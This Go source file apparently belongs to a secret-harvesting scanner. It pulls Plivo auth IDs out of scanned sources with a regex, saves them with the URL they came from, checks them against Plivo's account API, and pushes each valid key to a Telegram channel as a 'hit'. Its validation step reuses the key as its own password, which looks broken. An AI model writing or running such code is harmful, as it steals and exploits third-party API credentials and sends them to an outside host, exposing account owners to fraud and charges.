package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"time"
)

var plivoPattern = regexp.MustCompile(`(?i)(?:plivo[_-]?(?:auth[_-]?)?(?:id|sid))["'\s:=]+([MS]A[A-Z0-9]{18})`)

func (a *AWSScanner) CheckPlivo(key, sourceURL string) bool {
	if !a.Config.APIValidation.Plivo {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "plivo_found.txt")

	url := "https://api.plivo.com/v1/Account/" + key + "/"
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}
	req.SetBasicAuth(key, key)
	req.Header.Set("Accept", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	req = req.WithContext(ctx)

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false
	}

	var res struct {
		Name       string `json:"name"`
		AutoRecharge bool `json:"auto_recharge"`
	}
	json.NewDecoder(resp.Body).Decode(&res)
	info := res.Name

	a.logValid("Plivo", fmt.Sprintf("AuthID: %s | Name: %s", key, info))
	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_plivo.txt")
	a.storeValidKeyLimit("Plivo", key, info)

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := a.tgHit("📞", "PLIVO", sourceURL) + fmt.Sprintf(
		"\n🔑 <b>Auth ID:</b> <code>%s</code>\n👤 <b>Account:</b> %s\n", key, info)
	go a.sendTelegram(msg)
	return true
}
